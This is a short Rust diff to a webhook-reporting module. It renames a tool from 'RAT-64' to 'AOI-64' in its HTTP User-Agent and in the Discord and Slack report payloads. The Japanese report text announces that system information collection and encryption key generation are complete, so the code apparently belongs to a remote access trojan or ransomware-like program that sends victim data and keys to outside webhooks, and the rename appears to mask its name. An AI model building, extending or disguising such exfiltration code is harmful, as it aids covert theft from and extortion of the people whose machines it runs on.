@@ -67,7 +67,7 @@ pub fn send_unified_webhook(
     for attempt in 1..=config.retry_attempts {
         if let Ok(response) = minreq::post(webhook_url)
             .with_header("Content-Type", "application/json")
-            .with_header("User-Agent", "RAT-64/1.0")
+            .with_header("User-Agent", "AOI-64/1.0")
             .with_body(json_body.clone())
             .with_timeout(config.timeout_seconds)
             .send()
@@ -140,7 +140,7 @@ fn create_discord_unified_payload(
 
     serde_json::json!({
         "embeds": [{
-            "title": "🚀 RAT-64 Complete Report",
+            "title": "🚀 AOI-64 Complete Report",
             "description": "システム情報収集と暗号化キー生成が完了しました",
             "color": 0x7289da,
             "fields": [
@@ -155,7 +155,7 @@ fn create_discord_unified_payload(
                 {"name": "⚠️  注意", "value": "暗号化キーは慎重に管理してください", "inline": false}
             ],
             "timestamp": now_timestamp(),
-            "footer": {"text": "RAT-64 System Monitor | Complete Report"}
+            "footer": {"text": "AOI-64 System Monitor | Complete Report"}
         }]
     })
 }
@@ -185,7 +185,7 @@ fn create_slack_unified_payload(
                 "type": "header",
                 "text": {
                     "type": "plain_text",
-                    "text": "🚀 RAT-64 Complete Report"
+                    "text": "🚀 AOI-64 Complete Report"
                 }
             },
             {
